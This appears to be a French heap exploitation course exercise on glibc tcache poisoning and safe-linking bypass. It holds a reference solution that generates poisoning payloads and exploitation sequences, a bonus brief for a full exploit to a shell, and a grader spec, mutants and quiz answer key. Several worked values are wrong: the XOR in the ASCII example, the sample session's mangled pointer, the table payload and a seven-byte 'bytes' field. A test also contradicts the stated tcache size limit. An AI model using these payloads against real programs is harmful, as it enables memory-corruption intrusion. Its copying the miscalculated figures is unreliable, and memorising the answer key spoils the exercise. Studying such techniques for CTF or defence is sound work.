# Exercice 3.4.7-b : tcache_poison

**Module :**
3.4.7 — Heap Exploitation

**Concept :**
b — Tcache Poisoning et Safe-Linking Bypass

**Difficulte :**
★★★★★★★★★☆ (9/10)

**Type :**
code

**Tiers :**
2 — Concept composite

**Langage :**
Python 3.12

**Prerequis :**
- Exercice 3.4.7-a (heap_anatomy)
- Comprehension de la structure tcache
- Bases de l'exploitation heap moderne
- Arithmetique des pointeurs

**Domaines :**
Heap, Exploit, Mem

**Duree estimee :**
120 min

**XP Base :**
400

**Complexite :**
T3 O(n) x S3 O(n)

---

## SECTION 1 : PROTOTYPE & CONSIGNE

### 1.1 Obligations

**Fichier a rendre :**
`tcache_poison.py`

**Fonctions autorisees :**
- `json` (module standard)
- `struct` (parsing binaire)
- `sys` (arguments)
- Fonctions built-in Python

**Fonctions interdites :**
- pwntools
- Modules d'exploitation automatique

### 1.2 Consigne

#### 2.4.1 Contexte Culturel — "Breaking Bad"

*"I am the one who knocks."*

Dans **Breaking Bad**, Walter White transforme un element ordinaire (la chimie) en quelque chose d'extremement dangereux. Le tcache poisoning suit le meme principe : on transforme une simple liste de chunks libres en une arme d'exploitation.

Comme Heisenberg qui doit adapter ses methodes a mesure que les autorites renforcent leur surveillance, tu vas devoir adapter tes techniques de poisoning aux differentes versions de glibc et leurs protections croissantes.

#### 2.4.2 Enonce Academique

Le **tcache** (Thread-Local Cache) est un mecanisme d'optimisation de glibc 2.26+ qui maintient des listes chainees de chunks libres par thread. Le **tcache poisoning** consiste a corrompre ces listes pour obtenir une allocation a une adresse arbitraire.

**Ta mission :**

Ecrire un programme `tcache_poison.py` qui :

1. **Simule** un environnement tcache avec differentes versions glibc
2. **Genere** des payloads de tcache poisoning
3. **Calcule** les valeurs necessaires pour bypass safe-linking (glibc 2.32+)
4. **Detecte** si un poisoning est possible avec les primitives disponibles
5. **Produit** une sequence d'operations malloc/free pour l'exploitation

**Tcache Structure (glibc 2.31) :**
```
tcache_perthread_struct:
┌─────────────────────────────────────┐
│ counts[64]  (uint16_t each)         │  Nombre d'entries par bin
├─────────────────────────────────────┤
│ entries[64] (tcache_entry* each)    │  Tete de liste pour chaque taille
└─────────────────────────────────────┘

tcache_entry:
┌─────────────────────────────────────┐
│ next         (tcache_entry*)        │  Pointeur vers entry suivante
├─────────────────────────────────────┤
│ key          (uintptr_t) [2.29+]    │  Protection double-free
└─────────────────────────────────────┘
```

**Safe-Linking (glibc 2.32+) :**
```
Encoded:  next = real_next ^ (chunk_addr >> 12)
Decoded:  real_next = encoded_next ^ (chunk_addr >> 12)
```

**Entree :**
- Fichier JSON contenant :
  - `glibc_version` : Version cible (ex: "2.31", "2.35")
  - `target_addr` : Adresse ou on veut allouer
  - `heap_base` : Adresse de base du heap
  - `leak` : Adresse leakee (heap ou libc)
  - `primitive` : Type de primitive ("uaf", "overflow", "double_free")
  - `chunk_size` : Taille des chunks a utiliser

**Sortie :**
- JSON avec le payload et la sequence d'exploitation

**Contraintes :**
- Supporter glibc 2.27 a 2.38
- Gerer safe-linking quand necessaire
- Calculer les tcache keys pour bypass double-free protection
- Verifier l'alignement de target_addr (0x10)

**Exemples :**

| Entree | Sortie |
|--------|--------|
| `{"glibc_version": "2.31", "target_addr": "0x404000", "heap_base": "0x555555559000", "chunk_size": 32, "primitive": "uaf"}` | `{"strategy": "simple_poison", "payload": "0x404000", "operations": ["free(chunk_a)", "write(chunk_a, 0x404000)", "malloc(32)", "malloc(32) -> target"]}` |
| `{"glibc_version": "2.35", "target_addr": "0x404000", "heap_base": "0x555555559000", "leak": "0x555555559290", "chunk_size": 32, "primitive": "uaf"}` | `{"strategy": "safe_linking_bypass", "encoded_payload": "0x555000404", "operations": [...]}` |

### 1.3 Prototype

```python
#!/usr/bin/env python3
"""
tcache_poison.py - Generateur de payloads tcache poisoning
"""

import json
import struct
import sys

TCACHE_MAX_BINS = 64
TCACHE_FILL_COUNT = 7
MIN_CHUNK_SIZE = 0x20
SIZE_INCREMENT = 0x10

def get_tcache_idx(size: int) -> int:
    """Retourne l'index tcache pour une taille donnee."""
    pass

def encode_safe_linking(ptr: int, chunk_addr: int) -> int:
    """
    Encode un pointeur avec safe-linking (glibc 2.32+).

    Args:
        ptr: Pointeur a encoder
        chunk_addr: Adresse du chunk contenant le pointeur

    Returns:
        Pointeur encode
    """
    pass

def decode_safe_linking(encoded: int, chunk_addr: int) -> int:
    """Decode un pointeur safe-linking."""
    pass

def generate_tcache_key(heap_base: int, glibc_version: str) -> int:
    """
    Genere/calcule la tcache key pour bypass double-free.

    Args:
        heap_base: Base du heap
        glibc_version: Version glibc

    Returns:
        Valeur de la key tcache
    """
    pass

def check_alignment(addr: int) -> bool:
    """Verifie que l'adresse est alignee sur 0x10."""
    pass

def generate_poison_payload(data: dict) -> dict:
    """
    Genere le payload de tcache poisoning.

    Args:
        data: Configuration d'entree

    Returns:
        Dictionnaire avec strategy, payload, operations
    """
    pass

def main():
    """Point d'entree principal."""
    pass

if __name__ == "__main__":
    main()
```

---

## SECTION 2 : LE SAVIEZ-VOUS ?

### L'evolution du tcache

Le tcache a ete introduit dans glibc 2.26 pour ameliorer les performances des allocations/liberations frequentes. Chaque thread a son propre cache, eliminant le besoin de locks sur l'arena principale.

### Pourquoi safe-linking ?

Apres des annees d'exploitation tcache triviale, les developpeurs glibc ont ajoute safe-linking dans la version 2.32. Cette protection XOR le pointeur `next` avec `(addr >> 12)`, rendant l'exploitation plus difficile car elle necessite un leak heap pour calculer la valeur correcte.

### La course aux armements

| Attaque | Protection | Version |
|---------|-----------|---------|
| Double-free | tcache key | 2.29 |
| Tcache poisoning | Safe-linking | 2.32 |
| Safe-linking bypass | Count checks | 2.34 |

---

## SECTION 2.5 : DANS LA VRAIE VIE

**Metier : Exploit Developer / Security Researcher**

Les experts en exploitation heap utilisent le tcache poisoning pour :
- **CTF Challenges** : Technique tres courante en competition
- **CVE Exploitation** : Browser exploits, serveurs, etc.
- **Red Team** : Developpement d'exploits pour engagements

**Cas d'usage concret :**
Un chercheur chez Exodus Intelligence ou Zerodium developpe un exploit pour une vulnerabilite UAF dans un navigateur :
1. Trigger le UAF pour obtenir un chunk dangling
2. Spray avec des objets de meme taille
3. Tcache poison vers une vtable
4. Hijack le flux de controle

---

## SECTION 3 : EXEMPLE D'UTILISATION

### 3.0 Session bash

```bash
$ ls
tcache_poison.py  target.json

$ cat target.json
{
  "glibc_version": "2.31",
  "target_addr": "0x404060",
  "heap_base": "0x555555559000",
  "chunk_size": 32,
  "primitive": "uaf"
}

$ python3 tcache_poison.py target.json
{
  "strategy": "simple_tcache_poison",
  "has_safe_linking": false,
  "tcache_idx": 1,
  "payload": {
    "raw": "0x404060",
    "bytes": "60404000000000"
  },
  "operations": [
    {"step": 1, "action": "malloc", "size": 32, "result": "chunk_a"},
    {"step": 2, "action": "free", "target": "chunk_a", "note": "chunk_a -> tcache[0x20]"},
    {"step": 3, "action": "write", "target": "chunk_a.fd", "value": "0x404060", "note": "UAF write"},
    {"step": 4, "action": "malloc", "size": 32, "result": "chunk_b", "note": "returns chunk_a"},
    {"step": 5, "action": "malloc", "size": 32, "result": "target_ptr", "note": "returns 0x404060!"}
  ],
  "notes": [
    "glibc 2.31 has no safe-linking",
    "tcache key exists but not checked on poison"
  ]
}

$ cat safe_linking_target.json
{
  "glibc_version": "2.35",
  "target_addr": "0x404060",
  "heap_base": "0x555555559000",
  "leak": "0x555555559290",
  "chunk_size": 48,
  "primitive": "uaf"
}

$ python3 tcache_poison.py safe_linking_target.json
{
  "strategy": "safe_linking_bypass",
  "has_safe_linking": true,
  "tcache_idx": 2,
  "safe_linking_calculation": {
    "target": "0x404060",
    "chunk_addr": "0x555555559290",
    "mangled_ptr": "0x5555155ed070"
  },
  "payload": {
    "raw": "0x5555155ed070",
    "bytes": "70d0e55515550000"
  },
  "operations": [
    {"step": 1, "action": "malloc", "size": 48, "result": "chunk_a"},
    {"step": 2, "action": "free", "target": "chunk_a"},
    {"step": 3, "action": "write", "target": "chunk_a.next", "value": "0x5555155ed070", "note": "Safe-linked poison"},
    {"step": 4, "action": "malloc", "size": 48, "result": "chunk_b"},
    {"step": 5, "action": "malloc", "size": 48, "result": "target_ptr", "note": "returns 0x404060!"}
  ]
}
```

---

## SECTION 3.1 : BONUS STANDARD (OPTIONNEL)

**Difficulte Bonus :**
★★★★★★★★★★ (10/10)

**Recompense :**
XP x2

**Domaines Bonus :**
Heap, Exploit, ROP

### 3.1.1 Consigne Bonus

**Extension "Full Exploitation Chain" :**

Etendre le programme pour :

1. **Generer un exploit complet** vers shell via GOT overwrite
2. **Calculer les offsets libc** a partir du leak
3. **Choisir automatiquement** le one_gadget ou system()
4. **Gerer les contraintes** (tcache count, alignment, etc.)
5. **Produire du code pwntools** executable

### 3.1.2 Prototype Bonus

```python
def generate_full_exploit(data: dict) -> dict:
    """
    Genere un exploit complet tcache poison vers shell.

    Args:
        data: Configuration avec libc_path et cibles

    Returns:
        Dictionnaire avec code d'exploit et explications
    """
    pass

def calculate_libc_offsets(leak: int, symbol: str, libc_version: str) -> dict:
    """Calcule les offsets libc depuis un leak."""
    pass

def generate_pwntools_code(operations: list, target: str) -> str:
    """Genere du code pwntools pour l'exploit."""
    pass
```

### 3.1.3 Ce qui change par rapport a l'exercice de base

| Aspect | Base | Bonus |
|--------|------|-------|
| Output | Payload seul | Exploit complet |
| Offsets | Manuels | Calcules automatiquement |
| Code | JSON operations | Python/pwntools executable |
| Cible | Adresse fixe | GOT overwrite dynamique |

---

## SECTION 4 : ZONE CORRECTION (POUR LE TESTEUR)

### 4.1 Moulinette

| Test | Entree | Sortie Attendue | Points |
|------|--------|-----------------|--------|
| simple_poison_231 | glibc 2.31, UAF | strategy: simple_poison | 15 |
| safe_linking_235 | glibc 2.35, UAF | Calcul safe-linking correct | 20 |
| tcache_idx | size=0x30 | idx=2 | 5 |
| alignment_check | target=0x404003 | Erreur alignment | 10 |
| double_free_229 | glibc 2.29, double_free | key bypass strategy | 15 |
| overflow_primitive | primitive=overflow | Operations overflow | 10 |
| large_chunk | size=0x410 | Erreur: tcache max 0x400 | 5 |
| encode_decode | Round-trip safe-linking | Valeur identique | 10 |
| multiple_versions | Test toutes versions | Compatibilite | 10 |

### 4.2 Solution de reference

```python
#!/usr/bin/env python3
"""
tcache_poison.py - Solution de reference
"""

import json
import struct
import sys

TCACHE_MAX_BINS = 64
TCACHE_FILL_COUNT = 7
MIN_CHUNK_SIZE = 0x20
SIZE_INCREMENT = 0x10
MAX_TCACHE_SIZE = 0x410

# Versions avec differentes protections
SAFE_LINKING_VERSION = (2, 32)
TCACHE_KEY_VERSION = (2, 29)

def parse_version(version_str: str) -> tuple:
    """Parse une version string en tuple."""
    parts = version_str.split('.')
    return (int(parts[0]), int(parts[1]))

def parse_hex(value) -> int:
    """Convertit une valeur hex en int."""
    if isinstance(value, int):
        return value
    value = str(value).strip()
    if value.lower().startswith('0x'):
        return int(value, 16)
    return int(value, 16)

def get_tcache_idx(size: int) -> int:
    """Retourne l'index tcache pour une taille donnee."""
    if size < MIN_CHUNK_SIZE:
        size = MIN_CHUNK_SIZE
    # Aligner sur 0x10
    aligned_size = (size + 0xf) & ~0xf
    if aligned_size < MIN_CHUNK_SIZE:
        aligned_size = MIN_CHUNK_SIZE
    idx = (aligned_size - MIN_CHUNK_SIZE) // SIZE_INCREMENT
    return idx if idx < TCACHE_MAX_BINS else -1

def encode_safe_linking(ptr: int, chunk_addr: int) -> int:
    """Encode un pointeur avec safe-linking."""
    return ptr ^ (chunk_addr >> 12)

def decode_safe_linking(encoded: int, chunk_addr: int) -> int:
    """Decode un pointeur safe-linking."""
    return encoded ^ (chunk_addr >> 12)

def has_safe_linking(version: str) -> bool:
    """Verifie si la version a safe-linking."""
    return parse_version(version) >= SAFE_LINKING_VERSION

def has_tcache_key(version: str) -> bool:
    """Verifie si la version a tcache key."""
    return parse_version(version) >= TCACHE_KEY_VERSION

def generate_tcache_key(heap_base: int, glibc_version: str) -> int:
    """
    Calcule la tcache key.
    La key est l'adresse de tcache_perthread_struct.
    """
    # tcache_perthread_struct est au debut du heap + 0x10
    return heap_base + 0x10

def check_alignment(addr: int) -> bool:
    """Verifie l'alignement sur 0x10."""
    return (addr & 0xf) == 0

def generate_poison_payload(data: dict) -> dict:
    """Genere le payload de tcache poisoning."""
    glibc_version = data.get('glibc_version', '2.31')
    target_addr = parse_hex(data.get('target_addr', 0))
    heap_base = parse_hex(data.get('heap_base', 0))
    chunk_size = data.get('chunk_size', 32)
    primitive = data.get('primitive', 'uaf')
    leak = parse_hex(data.get('leak', heap_base))

    result = {
        'glibc_version': glibc_version,
        'has_safe_linking': has_safe_linking(glibc_version),
        'has_tcache_key': has_tcache_key(glibc_version)
    }

    # Verification de base
    if not check_alignment(target_addr):
        return {
            'error': 'Target address not aligned on 0x10',
            'target': hex(target_addr),
            'fix': hex(target_addr & ~0xf)
        }

    tcache_idx = get_tcache_idx(chunk_size)
    if tcache_idx < 0 or tcache_idx >= TCACHE_MAX_BINS:
        return {
            'error': 'Chunk size out of tcache range',
            'size': chunk_size,
            'max_tcache_size': MAX_TCACHE_SIZE
        }

    result['tcache_idx'] = tcache_idx

    # Calculer le payload
    if has_safe_linking(glibc_version):
        result['strategy'] = 'safe_linking_bypass'
        # On a besoin d'un leak pour calculer l'encodage
        chunk_addr = leak if leak else heap_base
        encoded = encode_safe_linking(target_addr, chunk_addr)

        result['safe_linking_calculation'] = {
            'target': hex(target_addr),
            'chunk_addr': hex(chunk_addr),
            'mangled_ptr': hex(encoded)
        }
        payload_value = encoded
    else:
        result['strategy'] = 'simple_tcache_poison'
        payload_value = target_addr

    result['payload'] = {
        'raw': hex(payload_value),
        'bytes': struct.pack('<Q', payload_value).hex()
    }

    # Generer les operations selon la primitive
    operations = []

    if primitive == 'uaf':
        operations = [
            {'step': 1, 'action': 'malloc', 'size': chunk_size, 'result': 'chunk_a'},
            {'step': 2, 'action': 'free', 'target': 'chunk_a',
             'note': f'chunk_a -> tcache[{hex(chunk_size)}]'},
            {'step': 3, 'action': 'write', 'target': 'chunk_a.next',
             'value': hex(payload_value), 'note': 'UAF write (poison fd)'},
            {'step': 4, 'action': 'malloc', 'size': chunk_size,
             'result': 'chunk_b', 'note': 'Returns chunk_a from tcache'},
            {'step': 5, 'action': 'malloc', 'size': chunk_size,
             'result': 'target_ptr', 'note': f'Returns {hex(target_addr)}!'}
        ]

    elif primitive == 'double_free':
        if has_tcache_key(glibc_version):
            # Besoin de bypass la key
            tcache_key = generate_tcache_key(heap_base, glibc_version)
            operations = [
                {'step': 1, 'action': 'malloc', 'size': chunk_size, 'result': 'chunk_a'},
                {'step': 2, 'action': 'free', 'target': 'chunk_a'},
                {'step': 3, 'action': 'write', 'target': 'chunk_a.key',
                 'value': 'corrupted', 'note': f'Corrupt key (was {hex(tcache_key)})'},
                {'step': 4, 'action': 'free', 'target': 'chunk_a',
                 'note': 'Double free succeeds (key corrupted)'},
                {'step': 5, 'action': 'malloc', 'size': chunk_size, 'result': 'chunk_b'},
                {'step': 6, 'action': 'write', 'target': 'chunk_b.next',
                 'value': hex(payload_value)},
                {'step': 7, 'action': 'malloc', 'size': chunk_size, 'result': 'chunk_c'},
                {'step': 8, 'action': 'malloc', 'size': chunk_size,
                 'result': 'target_ptr', 'note': f'Returns {hex(target_addr)}!'}
            ]
        else:
            operations = [
                {'step': 1, 'action': 'malloc', 'size': chunk_size, 'result': 'chunk_a'},
                {'step': 2, 'action': 'free', 'target': 'chunk_a'},
                {'step': 3, 'action': 'free', 'target': 'chunk_a',
                 'note': 'Double free (no protection)'},
                {'step': 4, 'action': 'malloc', 'size': chunk_size, 'result': 'chunk_b'},
                {'step': 5, 'action': 'write', 'target': 'chunk_b.next',
                 'value': hex(payload_value)},
                {'step': 6, 'action': 'malloc', 'size': chunk_size, 'result': 'chunk_c'},
                {'step': 7, 'action': 'malloc', 'size': chunk_size,
                 'result': 'target_ptr'}
            ]

    elif primitive == 'overflow':
        operations = [
            {'step': 1, 'action': 'malloc', 'size': chunk_size, 'result': 'chunk_a'},
            {'step': 2, 'action': 'malloc', 'size': chunk_size, 'result': 'chunk_b'},
            {'step': 3, 'action': 'free', 'target': 'chunk_b'},
            {'step': 4, 'action': 'overflow', 'from': 'chunk_a', 'target': 'chunk_b.next',
             'value': hex(payload_value), 'note': 'Heap overflow into freed chunk'},
            {'step': 5, 'action': 'malloc', 'size': chunk_size, 'result': 'chunk_c'},
            {'step': 6, 'action': 'malloc', 'size': chunk_size,
             'result': 'target_ptr', 'note': f'Returns {hex(target_addr)}!'}
        ]

    result['operations'] = operations

    # Notes explicatives
    notes = []
    if has_safe_linking(glibc_version):
        notes.append(f'glibc {glibc_version} has safe-linking, need heap leak for bypass')
    else:
        notes.append(f'glibc {glibc_version} has no safe-linking, direct poisoning possible')

    if has_tcache_key(glibc_version):
        notes.append('tcache key protection active for double-free')

    result['notes'] = notes

    return result

def main():
    """Point d'entree principal."""
    if len(sys.argv) < 2:
        print("Usage: tcache_poison.py <config.json | ->", file=sys.stderr)
        sys.exit(1)

    input_file = sys.argv[1]

    if input_file == '-':
        data = json.load(sys.stdin)
    else:
        with open(input_file, 'r') as f:
            data = json.load(f)

    result = generate_poison_payload(data)
    print(json.dumps(result, indent=2))

if __name__ == "__main__":
    main()
```

### 4.3 Solutions alternatives acceptees

```python
# Alternative: Utilisation de dataclass pour les chunks
from dataclasses import dataclass

@dataclass
class TcacheEntry:
    addr: int
    next: int
    key: int = 0

    def encode_next(self, target: int, has_sl: bool) -> int:
        if has_sl:
            return target ^ (self.addr >> 12)
        return target
```

### 4.4 Solutions refusees

```python
# REFUSE: Ne gere pas safe-linking
def generate_payload_bad(target_addr):
    return target_addr  # Ignore safe-linking!

# Pourquoi: Sur glibc 2.32+, le payload doit etre encode
```

```python
# REFUSE: Mauvaise formule safe-linking
def encode_bad(ptr, addr):
    return ptr ^ addr  # FAUX!

# Pourquoi: La formule est ptr ^ (addr >> 12), pas ptr ^ addr
```

### 4.5 spec.json (ENGINE v22.1)

```json
{
  "name": "tcache_poison",
  "language": "python",
  "version": "3.12",
  "type": "code",
  "tier": 2,
  "tags": ["heap", "tcache", "exploitation", "safe-linking", "phase3"],
  "passing_score": 70,

  "function": {
    "name": "generate_poison_payload",
    "prototype": "def generate_poison_payload(data: dict) -> dict",
    "return_type": "dict"
  },

  "driver": {
    "edge_cases": [
      {
        "name": "simple_231",
        "args": [{"glibc_version": "2.31", "target_addr": "0x404000", "heap_base": "0x10000", "chunk_size": 32, "primitive": "uaf"}],
        "check": "result['strategy'] == 'simple_tcache_poison' and result['has_safe_linking'] == False"
      },
      {
        "name": "safe_linking_235",
        "args": [{"glibc_version": "2.35", "target_addr": "0x404000", "heap_base": "0x555555559000", "leak": "0x555555559290", "chunk_size": 32, "primitive": "uaf"}],
        "check": "result['strategy'] == 'safe_linking_bypass' and 'safe_linking_calculation' in result"
      },
      {
        "name": "misaligned",
        "args": [{"glibc_version": "2.31", "target_addr": "0x404003", "heap_base": "0x10000", "chunk_size": 32, "primitive": "uaf"}],
        "check": "'error' in result"
      }
    ]
  }
}
```

### 4.6 Solutions Mutantes

```python
# Mutant A: Mauvais calcul safe-linking
def encode_safe_linking_mutant(ptr, chunk_addr):
    return ptr ^ (chunk_addr >> 8)  # >> 8 au lieu de >> 12!

# Mutant B: Ignore la verification d'alignement
def check_alignment_mutant(addr):
    return True  # Toujours True!

# Mutant C: Mauvais index tcache
def get_tcache_idx_mutant(size):
    return size // 0x10  # Oublie MIN_CHUNK_SIZE!

# Mutant D: Inverse les conditions de version
def has_safe_linking_mutant(version):
    return parse_version(version) < SAFE_LINKING_VERSION  # < au lieu de >=!

# Mutant E: Operations incorrectes pour double-free
def gen_double_free_mutant(data):
    # Manque l'etape de corruption de key
    return [
        {'action': 'free', 'target': 'chunk_a'},
        {'action': 'free', 'target': 'chunk_a'}  # Va echouer sur glibc 2.29+!
    ]
```

---

## SECTION 5 : COMPRENDRE

### 5.1 Ce que cet exercice enseigne

1. **Mecanisme tcache** : Comment fonctionne le cache per-thread
2. **Tcache poisoning** : Corruption des listes pour allocation arbitraire
3. **Safe-linking** : Protection moderne et son bypass
4. **Evolution des protections** : Adaptation aux differentes versions glibc

### 5.2 LDA - Traduction litterale

```
FONCTION generate_poison_payload QUI RETOURNE DICTIONNAIRE ET PREND data DICTIONNAIRE
DEBUT FONCTION
    EXTRAIRE glibc_version, target_addr, heap_base, chunk_size, primitive DE data

    SI target_addr N'EST PAS ALIGNE SUR 0x10 ALORS
        RETOURNER ERREUR avec message alignement
    FIN SI

    CALCULER tcache_idx DEPUIS chunk_size

    SI version >= 2.32 ALORS
        CALCULER encoded = target_addr XOR (leak >> 12)
        AFFECTER strategy = "safe_linking_bypass"
    SINON
        AFFECTER encoded = target_addr
        AFFECTER strategy = "simple_tcache_poison"
    FIN SI

    GENERER operations SELON primitive (uaf, double_free, overflow)

    RETOURNER DICTIONNAIRE avec strategy, payload, operations
FIN FONCTION
```

### 5.3 Visualisation ASCII

```
                TCACHE POISONING ATTACK
    ┌─────────────────────────────────────────────────────────┐
    │  AVANT POISONING                                        │
    │                                                         │
    │  tcache_entry[0x20]:                                    │
    │  ┌─────────┐      ┌─────────┐                          │
    │  │  head   │ ───► │ chunk_a │ ───► NULL                 │
    │  └─────────┘      │  next   │                          │
    │                   └─────────┘                          │
    │                                                         │
    │  APRES UAF WRITE (chunk_a.next = target)               │
    │                                                         │
    │  tcache_entry[0x20]:                                    │
    │  ┌─────────┐      ┌─────────┐      ┌─────────┐         │
    │  │  head   │ ───► │ chunk_a │ ───► │ TARGET! │         │
    │  └─────────┘      │  next   │      │0x404000 │         │
    │                   └─────────┘      └─────────┘         │
    │                                                         │
    │  APRES malloc() x2:                                     │
    │                                                         │
    │  1. malloc(0x20) -> chunk_a (retire de tcache)         │
    │  2. malloc(0x20) -> 0x404000 (ARBITRARY ALLOCATION!)   │
    └─────────────────────────────────────────────────────────┘

                SAFE-LINKING (glibc 2.32+)
    ┌─────────────────────────────────────────────────────────┐
    │                                                         │
    │  ENCODAGE:  next_stored = next_real ^ (chunk_addr >> 12)│
    │                                                         │
    │  Exemple:                                               │
    │  - target = 0x404060                                    │
    │  - chunk_addr = 0x555555559290                          │
    │  - chunk_addr >> 12 = 0x555555559                       │
    │  - encoded = 0x404060 ^ 0x555555559 = 0x555111439       │
    │                                                         │
    │  Sans leak heap, impossible de calculer l'encodage!     │
    └─────────────────────────────────────────────────────────┘
```

### 5.4 Les pieges en detail

#### Piege 1 : Oublier safe-linking sur glibc moderne

```python
# MAUVAIS: Fonctionne uniquement sur glibc < 2.32
payload = target_addr

# BON: Verifier la version et encoder si necessaire
if glibc_version >= (2, 32):
    payload = target_addr ^ (chunk_addr >> 12)
else:
    payload = target_addr
```

#### Piege 2 : Target non aligne

```python
# MAUVAIS: Va corrompre le heap
target = 0x404003  # Non aligne!

# BON: Verifier l'alignement
if target & 0xf != 0:
    raise ValueError("Target must be 0x10-aligned")
```

### 5.5 Cours Complet

#### 5.5.1 Anatomie du tcache

Le tcache maintient jusqu'a 7 chunks par bin, pour 64 bins (tailles 0x20 a 0x410). Structure:

```c
typedef struct tcache_entry {
    struct tcache_entry *next;
    struct tcache_perthread_struct *key;  // glibc 2.29+
} tcache_entry;

typedef struct tcache_perthread_struct {
    uint16_t counts[TCACHE_MAX_BINS];
    tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;
```

#### 5.5.2 Exploitation etape par etape

1. **Obtenir un chunk dans tcache** : malloc + free
2. **Corrompre le pointeur next** : UAF, overflow, ou double-free
3. **Pointer vers la cible** : Adresse ou on veut allouer
4. **Declencher l'allocation** : malloc() retourne notre cible

---

## SECTION 6 : PIEGES - RECAPITULATIF

| # | Piege | Consequence | Solution |
|---|-------|-------------|----------|
| 1 | Ignorer safe-linking | Pointeur invalide, crash | Encoder avec chunk_addr >> 12 |
| 2 | Target non aligne | Corruption, crash | Verifier (addr & 0xf) == 0 |
| 3 | Taille hors tcache | Pas dans tcache | Utiliser 0x20 <= size <= 0x410 |
| 4 | Oublier tcache key | Double-free detecte | Corrompre key avant 2eme free |
| 5 | Mauvais leak | Encodage faux | Utiliser adresse du chunk victim |

---

## SECTION 7 : QCM

### Question 1
**Quelle est la formule de safe-linking dans glibc 2.32+ ?**

A) next ^ heap_base
B) next ^ (addr >> 12)
C) next + heap_base
D) next XOR key
E) next ^ (addr >> 8)

**Reponse : B**

### Question 2
**Combien de chunks maximum peut contenir un bin tcache ?**

A) 4
B) 5
C) 7
D) 10
E) Illimite

**Reponse : C**

### Question 3
**Dans quelle version glibc la tcache key a-t-elle ete introduite ?**

A) 2.26
B) 2.27
C) 2.29
D) 2.31
E) 2.32

**Reponse : C**

### Question 4
**Quelle taille maximum est geree par tcache ?**

A) 0x80
B) 0x100
C) 0x200
D) 0x400
E) 0x410

**Reponse : E (0x410 = 1040 bytes)**

### Question 5
**Pourquoi faut-il un leak heap pour bypass safe-linking ?**

A) Pour calculer la tcache key
B) Pour decoder le pointeur existant
C) Pour calculer (addr >> 12) pour l'encodage
D) Pour trouver la libc
E) Pour verifier l'alignement

**Reponse : C**

---

## SECTION 8 : RECAPITULATIF

| Element | Valeur |
|---------|--------|
| **Difficulte** | ★★★★★★★★★☆ (9/10) |
| **Temps estime** | 120 min |
| **XP Base** | 400 |
| **XP Bonus** | x2 (800 total) |
| **Concepts cles** | Tcache, Safe-linking, UAF, Double-free |

---

## SECTION 9 : DEPLOYMENT PACK

```json
{
  "deploy": {
    "hackbrain_version": "5.5.2",
    "engine_version": "v22.1",
    "exercise_slug": "3.4.7-b-tcache-poison",
    "generated_at": "2026-01-16 15:30:00",

    "metadata": {
      "exercise_id": "3.4.7-b",
      "exercise_name": "tcache_poison",
      "module": "3.4.7",
      "module_name": "Heap Exploitation",
      "concept": "b",
      "concept_name": "Tcache Poisoning et Safe-Linking Bypass",
      "difficulty": 9,
      "difficulty_stars": "★★★★★★★★★☆",
      "xp_base": 400,
      "tags": ["heap", "tcache", "poisoning", "safe-linking", "glibc"]
    }
  }
}
```
